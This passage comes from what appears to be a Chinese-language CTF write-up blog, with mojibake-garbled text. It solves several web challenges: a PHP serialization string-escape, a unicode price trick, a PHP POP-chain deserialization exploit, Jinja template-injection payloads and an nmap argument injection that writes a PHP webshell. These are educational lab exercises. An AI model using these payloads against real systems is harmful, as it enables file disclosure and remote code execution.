class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$function</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">sha1</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰“å¼€<code>phpinfo</code>ç•Œé¢å‘ç°<code>d0g3_f1ag.php</code>ï¼Œæ€è·¯å°±æ˜¯åˆ©ç”¨åˆ¤æ–­<code>$function == &#39;show_image&#39;</code>å¤„çš„ä»£ç ï¼Œé€šè¿‡ååºåˆ—åŒ–å¯¹<code>img</code>å˜è„¸è¿›è¡Œèµ‹å€¼ï¼Œç„¶åè¿›è¡Œæ–‡ä»¶è¯»å–</p><h3 id="é”®é€ƒé€¸"><a href="#é”®é€ƒé€¸" class="headerlink" title="é”®é€ƒé€¸"></a>é”®é€ƒé€¸</h3><p>éœ€è¦ä¸€ä¸ªé”®å€¼å¯¹å°±è¡Œäº†ï¼Œç›´æ¥æ„é€ ä¼šè¢«è¿‡æ»¤çš„é”®ï¼Œè¿™æ ·å€¼å¾—ä¸€éƒ¨åˆ†å……å½“é”®ï¼Œå‰©ä¸‹å¾—ä¸€éƒ¨åˆ†ä½œä¸ºå•ç‹¬çš„é”®å€¼å¯¹</p><p>ç”±äº<code>flag</code>å­—ç¬¦ä¸²ä¼šè¢«è¿‡æ»¤ï¼Œæ•…å¯ä»¥æ„é€ </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_SESSION[&#x27;flagflag&#x27;] = &#x27;&quot;;s:3:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&#x27;</span><br></pre></td></tr></table></figure><p>åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²åœ¨è¿‡æ»¤å‰åä¸º</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:4:&#123;s:4:&quot;user&quot;;s:5:&quot;guest&quot;;s:8:&quot;function&quot;;s:10:&quot;show_image&quot;;s:8:&quot;flagflag&quot;;s:51:&quot;&quot;;s:3:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</span><br><span class="line"></span><br><span class="line">a:4:&#123;s:4:&quot;user&quot;;s:5:&quot;guest&quot;;s:8:&quot;function&quot;;s:10:&quot;show_image&quot;;s:8:&quot;&quot;;s:51:&quot;&quot;;s:3:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ ·çš„è¯ï¼Œç»è¿‡è¿‡æ»¤ï¼Œä¼šå‡ºç°<code>&quot;;s:51:&quot;=&gt;aaa</code>é”®å€¼å¯¹ï¼Œè¿›è€Œè¾¾åˆ°äº†å¯¹<code>img</code>å˜é‡çš„è¦†ç›–ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GETï¼š</span><br><span class="line">/index.php?f=show_image</span><br><span class="line">POSTï¼š</span><br><span class="line">_SESSION[flagflag]=&quot;;s:3:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</span><br></pre></td></tr></table></figure><p>é˜…è¯»æºç å‘ç°</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;flag in /d0g3_fllllllag&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è·å–<code>flag</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GETï¼š</span><br><span class="line">/index.php?f=show_image</span><br><span class="line">POSTï¼š</span><br><span class="line">_SESSION[flagflag]=&quot;;s:3:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;</span><br></pre></td></tr></table></figure><h3 id="å€¼é€ƒé€¸"><a href="#å€¼é€ƒé€¸" class="headerlink" title="å€¼é€ƒé€¸"></a>å€¼é€ƒé€¸</h3><p>éœ€è¦ä¸¤ä¸ªè¿ç»­çš„é”®å€¼å¯¹ï¼Œç”±ç¬¬ä¸€ä¸ªçš„å€¼è¦†ç›–ç¬¬äºŒä¸ªçš„é”®ï¼Œè¿™æ ·ç¬¬äºŒä¸ªå€¼å°±é€ƒé€¸å‡ºå»ï¼Œå•ç‹¬ä½œä¸ºä¸€ä¸ªé”®å€¼å¯¹</p><p>åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²åœ¨è¿‡æ»¤å‰åä¸º</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:3:&#123;s:4:&quot;user&quot;;s:24:&quot;flagflagflagflagflagflag&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</span><br><span class="line">a:3:&#123;s:4:&quot;user&quot;;s:24:&quot;&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆ<code>payload</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GETï¼š</span><br><span class="line">/index.php?f=show_image</span><br><span class="line">POSTï¼š</span><br><span class="line">_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;</span><br></pre></td></tr></table></figure><h2 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h2><p><code>unicode</code>æ¬ºéª—ï¼Œä½¿ç”¨<a href="https://www.compart.com/en/unicode/U+2188">â†ˆ</a>è¿›è¡Œè´­ä¹°å³å¯</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/charge</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>a6036e5c-010e-4543-97de-377a5e562999.node4.buuoj.cn:81</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>20</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://a6036e5c-010e-4543-97de-377a5e562999.node4.buuoj.cn:81</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://a6036e5c-010e-4543-97de-377a5e562999.node4.buuoj.cn:81/charge</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">id</span>=<span class="number">4</span>&amp;price=%E2%<span class="number">86</span>%<span class="number">88</span></span></span><br></pre></td></tr></table></figure><h2 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h2><p>æ‰“å¼€å¾—åˆ°æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Welcome to index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="variable language_">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Show</span>;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨é“¾</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include &lt;- Modifier::__invoke &lt;- Test::__get &lt;- Show::__toString &lt;- Show::__construct</span><br></pre></td></tr></table></figure><p><code>exp</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="comment">//include &lt;- Modifier::__invoke &lt;- Test::__get &lt;- Show::__toString &lt;- Show::__construct</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span> = <span class="string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">new</span> <span class="title class_">Modifier</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$obj</span>-&gt;source = <span class="variable">$obj</span>;</span><br><span class="line"><span class="variable">$obj</span>-&gt;str = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æœ€ç»ˆ<code>payload</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?pop=O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Br%3A1%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7D</span><br></pre></td></tr></table></figure><h2 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h2><p>æ‰“å¼€å¾—æºç </p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> flask </span><br><span class="line"><span class="keyword">import</span> os </span><br><span class="line">app = flask.Flask(__name__) </span><br><span class="line">app.config[<span class="string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="string">&#x27;FLAG&#x27;</span>) </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(): </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read() </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/shrine/&#x27;</span></span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shrine</span>(<span class="params">shrine</span>): </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">safe_jinja</span>(<span class="params">s</span>): </span><br><span class="line">        s = s.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;&#x27;</span>) </span><br><span class="line">        blacklist = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;self&#x27;</span>] </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s </span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine)) </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>: </span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p><code>SSTI</code>æ¨¡æ¿æ³¨å…¥</p><blockquote><p>url_forè¿™ä¸ªå¯ä»¥ç”¨æ¥æ„é€ urlï¼Œæ¥å—å‡½æ•°åä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°</p><p>get_flashed_message()æ˜¯é€šè¿‡flash()ä¼ å…¥é—ªç°ä¿¡æ¯åˆ—è¡¨çš„ï¼Œèƒ½å¤ŸæŠŠå­—ç¬¦ä¸²å¯¹è±¡è¡¨ç¤ºçš„ä¿¡æ¯åŠ å…¥åˆ°ä¸€ä¸ªæ¶ˆæ¯åˆ—è¡¨ï¼Œç„¶åé€šè¿‡è°ƒç”¨get_flashed_message()æ¥å–å‡ºã€‚</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#payload-1</span><br><span class="line">/shrine/&#123;&#123;url_for.__globals__[&#x27;current_app&#x27;].config&#125;&#125;</span><br><span class="line">#payload-2</span><br><span class="line">/shrine/&#123;&#123;get_flashed_messages.__globals__[&#x27;current_app&#x27;].config&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="ç½‘é¼æ¯-2020-æœ±é›€ç»„-Nmap"><a href="#ç½‘é¼æ¯-2020-æœ±é›€ç»„-Nmap" class="headerlink" title="[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap"></a>[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap</h2><p><code>nmap</code>ä½¿ç”¨è¯­å¥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -v 127.0.0.1 ç»™å‡ºäº†è¿œç¨‹æœºå™¨æ›´è¯¦ç»†çš„ä¿¡æ¯ï¼Œæ˜¾ç¤ºå†—ä½™ä¿¡æ¯(æ‰«æç»†èŠ‚)</span><br><span class="line">nmap -iL nmaptest.txt è¿è¡Œå¸¦â€œiLâ€ é€‰é¡¹çš„nmapå‘½ä»¤æ¥æ‰«ææ–‡ä»¶ä¸­åˆ—å‡ºçš„æ‰€æœ‰IPåœ°å€</span><br><span class="line">nmap 192.168.0.* --exclude 192.168.0.100 ä½¿ç”¨â€œ-excludeâ€é€‰é¡¹æ¥æ’é™¤æŸäº›ä½ ä¸æƒ³è¦æ‰«æçš„ä¸»æœº</span><br><span class="line">nmap -A 192.168.0.101 å¯ç”¨æ“ä½œç³»ç»Ÿå’Œç‰ˆæœ¬æ£€æµ‹ï¼Œè„šæœ¬æ‰«æå’Œè·¯ç”±è·Ÿè¸ªåŠŸèƒ½</span><br><span class="line">nmap -O 127.0.0.1 ä½¿ç”¨é€‰é¡¹â€œ-Oâ€å’Œâ€œ-osscan-guessâ€ä¹Ÿå¸®åŠ©æ¢æµ‹æ“ä½œç³»ç»Ÿä¿¡æ¯</span><br><span class="line">nmap -sA 192.168.0.101 æ‰«æè¿œç¨‹ä¸»æœºä»¥æ¢æµ‹è¯¥ä¸»æœºæ˜¯å¦ä½¿ç”¨äº†åŒ…è¿‡æ»¤å™¨æˆ–é˜²ç«å¢™</span><br><span class="line">nmap -PN 192.168.0.101 æ‰«æä¸»æœºæ£€æµ‹å…¶æ˜¯å¦å—åˆ°æ•°æ®åŒ…è¿‡æ»¤è½¯ä»¶æˆ–é˜²ç«å¢™çš„ä¿æŠ¤</span><br><span class="line">nmap -sP 192.168.0.* æ‰¾å‡ºç½‘ç»œä¸­çš„åœ¨çº¿ä¸»æœº</span><br><span class="line">nmap -F 192.168.0.101 å¿«é€Ÿæ‰«æï¼Œä»…æ‰«ænmap-servicesæ–‡ä»¶ä¸­çš„ç«¯å£è€Œé¿å¼€æ‰€æœ‰å…¶å®ƒçš„ç«¯å£</span><br><span class="line">nmap -f 192.168.96.4 ä½¿ç”¨å°æ•°æ®åŒ…å‘é€ï¼Œé¿å…è¢«è¯†åˆ«å‡º</span><br><span class="line">nmap -r 192.168.0.101 ä¸ä¼šéšæœºçš„é€‰æ‹©ç«¯å£æ‰«æ</span><br><span class="line">nmap -p 80,443 192.168.0.101 ä½¿ç”¨â€œ-Pâ€é€‰é¡¹æŒ‡å®šä½ æƒ³è¦æ‰«æçš„ç«¯å£</span><br><span class="line">nmap -sV 192.168.0.101 æŸ¥æ‰¾ä¸»æœºæœåŠ¡ç‰ˆæœ¬å·</span><br><span class="line">nmap -PS 192.168.0.101 ä½¿ç”¨TCP ACKå’ŒTCP Synæ–¹æ³•æ¥æ‰«æè¿œç¨‹ä¸»æœºï¼ˆé˜²ç«å¢™ä¼šé˜»æ–­æ ‡ICMPåŒ…ï¼‰</span><br><span class="line">nmap -Pn 192.168.96.4 ç›®æ ‡æœºç¦ç”¨pingï¼Œç»•è¿‡pingæ‰«æ</span><br><span class="line">nmap -sn 192.168.96.4 å¯¹ç›®æ ‡è¿›è¡Œpingæ£€æµ‹ï¼Œä¸è¿›è¡Œç«¯å£æ‰«æï¼ˆå‘é€å››ç§æŠ¥æ–‡ç¡®å®šç›®æ ‡æ˜¯å¦å­˜æ´»ï¼‰</span><br><span class="line">nmap -sS 192.168.0.101 æ‰§è¡Œä¸€æ¬¡éšè”½çš„æ‰«æï¼Œå®‰å…¨ï¼Œå¿«</span><br><span class="line">nmap -sT 192.168.0.101 ä½¿ç”¨TCP Synæ‰«ææœ€å¸¸ç”¨çš„ç«¯å£ï¼Œä¸å®‰å…¨ï¼Œæ…¢</span><br><span class="line">nmap -sN 192.168.0.101 æ‰§è¡ŒTCPç©ºæ‰«æä»¥éª—è¿‡é˜²ç«å¢™</span><br><span class="line">nmap -sI åƒµå°¸ip ç›®æ ‡ip ä½¿ç”¨åƒµå°¸æœºå¯¹ç›®æ ‡æœºå‘é€æ•°æ®åŒ…</span><br><span class="line">nmap 192.168.96.4 -oX myscan.xml å¯¹æ‰«æç»“æœå¦å­˜åœ¨myscan.xml</span><br><span class="line">nmap -T1~6 192.168.96.4 è®¾ç½®æ‰«æé€Ÿåº¦ï¼Œä¸€èˆ¬T4è¶³å¤Ÿ</span><br><span class="line">nmap â€“mtu 192.168.96.4 å‘é€çš„åŒ…å¤§å°,æœ€å¤§ä¼ è¾“å•å…ƒå¿…é¡»æ˜¯8çš„æ•´æ•°</span><br><span class="line">nmap -D &lt;å‡ip&gt; 192.168.96.4 å‘é€å‚æ‚ç€å‡ipçš„æ•°æ®åŒ…æ£€æµ‹</span><br><span class="line">ç»§ç»­ä¸­æ–­æ‰«æï¼š</span><br><span class="line">nmap â€“oG 1.txt â€“v 192.168.1.1/24 -oGå°†æ‰«æç»“æœä¿å­˜ä¸ºTXTï¼ŒCtrl+Cä¸­æ–­æ‰«æ</span><br><span class="line">Nmap â€“resume 1.txt ä½œç”¨ï¼šç»§ç»­æ‰«æ</span><br><span class="line">å‚è€ƒï¼š</span><br></pre></td></tr></table></figure><blockquote><p>å‚è€ƒï¼š<a href="https://blog.csdn.net/pakho_c/article/details/126012963">[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap</a></p></blockquote><p>å†™å…¥ä¸€å¥è¯æœ¨é©¬å³å¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; &lt;?=@eval($_POST[a]);?&gt; -oG shell.phtml &#x27;</span><br></pre></td></tr></table></figure><h2 id="CISCN-2019-åˆèµ›-Love-Math"><a href="#CISCN-2019-åˆèµ›-Love-Math" class="headerlink" title="[CISCN 2019 åˆèµ›]Love Math"></a>[CISCN 2019 åˆèµ›]Love Math</h2><p>æ‰“å¼€å¾—åˆ°æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//å¬è¯´ä½ 